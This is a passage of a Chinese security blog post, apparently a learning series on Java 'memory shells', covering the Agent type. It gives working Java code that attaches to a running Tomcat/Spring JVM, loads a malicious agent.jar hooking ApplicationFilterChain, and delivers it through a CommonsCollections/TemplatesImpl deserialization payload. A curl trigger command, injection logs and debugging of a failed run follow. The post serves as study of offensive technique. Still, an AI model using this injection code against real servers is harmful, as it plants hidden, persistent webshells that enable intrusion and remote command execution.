class="hljs-string">&quot;        response.getOutputStream().close();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        e.printStackTrace();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;&#125;&quot;</span>);<br>                <span class="hljs-type">byte</span>[] bytes = c.toBytecode();<br><br>                c.detach();<br><br>                <span class="hljs-keyword">return</span> bytes;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>maven 打包后 得到的 target&#x2F;Demo02-1.0-SNAPSHOT.jar  就是我们需要的 agent.jar</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>编写java代码来将其加载进JVM中</p>
+<p>其中大致思路为获取到JVM的PID，调用 loadAgent 方法将 agent.jar 注入</p>
+<h4 id="InjectMain-java"><a href="#InjectMain-java" class="headerlink" title="InjectMain.java"></a>InjectMain.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// 列出当前有哪些 JVM 进程在运行</span><br>                <span class="hljs-comment">// 这里的 if 条件根据实际情况进行更改</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// 获取对应进程的 pid 号</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="CC-反序列化注入"><a href="#CC-反序列化注入" class="headerlink" title="CC 反序列化注入"></a>CC 反序列化注入</h4><p>通过CC反序列化进行注入Agent内存马， 编译生成 <code>Test.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// 列出当前有哪些 JVM 进程在运行</span><br>                <span class="hljs-comment">// 这里的 if 条件根据实际情况进行更改</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// 获取对应进程的 pid 号</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p> 用 <strong>java-chains</strong> , 把 <code>Test.class</code> 注入到 <code>TemplatesImpl</code> 的 <code>_bytecodes</code>，生成了 <code>JavaNativePayload_…txt</code> 文件。  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">curl -v <span class="hljs-string">&quot;http://localhost:8089/cc&quot;</span> --data-<span class="hljs-built_in">binary</span> <span class="hljs-symbol">@test</span>.ser<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ol>
+<li>内存马注入情况</li>
+</ol>
+<p>从日志来看：</p>
+<p>Running JVM list …</p>
+<p>id &gt;&gt;&gt; 40008</p>
+<p>Find the Inject Class: org.apache.catalina.core.ApplicationFilterChain</p>
+<p>Agent.jar Inject Success !!</p>
+<p>使用的 Demo02-1.0-SNAPSHOT.jar 成功 attach 到了目标 JVM（PID 40008）。</p>
+<p>org.apache.catalina.core.ApplicationFilterChain 作为 hook 入口已经被找到。</p>
+<p>也就是说，内存马的 Agent 部分已经成功加载到 JVM。</p>
+<p>所以注入是成功的，这部分没有问题</p>
+<p>1. </p>
+<p> curl 请求触发了 POST &#x2F;cc，但是返回：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.NullPointerException: <span class="hljs-literal">null</span><br>	at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:<span class="hljs-number">372</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:<span class="hljs-number">456</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:<span class="hljs-number">486</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:<span class="hljs-number">64</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:<span class="hljs-number">62</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:<span class="hljs-number">45</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at java.lang.reflect.Constructor.newInstance(Constructor.java:<span class="hljs-number">422</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br></code></pre></td></tr></table></figure>
+
+
+
+<p>分析原因：</p>
+<p>你上传的 payload 是基于 CommonsCollections K3 + TemplatesImpl 的序列化。</p>
+<p>错误发生在 TemplatesImpl 初始化阶段的 postInitialization 方法：</p>
+<p>NullPointerException 一般是因为 TemplatesImpl 中 _bytecodes 或 _name 等字段为 null。</p>
+<p>也就是说  test.ser 文件中，<strong>TemplatesImpl 对象没有正确填充字节码</strong>….</p>
+<p>为什么生成的时候没有写进去呢？</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p>
+<p>[基础篇 - Javassist 使用指南](<a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p>
+<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java 内存马第四篇 - Agent 内存马</div>
+      <div>http://xvshifu.github.io/2025/11/08/Java 内存马第四篇 - Agent 内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/" title="Java内存马——Tomcat Valve型的三种注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java内存马——Tomcat Valve型的三种注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java 内存马第三篇 - Spring 内存马">
+                        <span class="hidden-mobile">Java 内存马第三篇 - Spring 内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
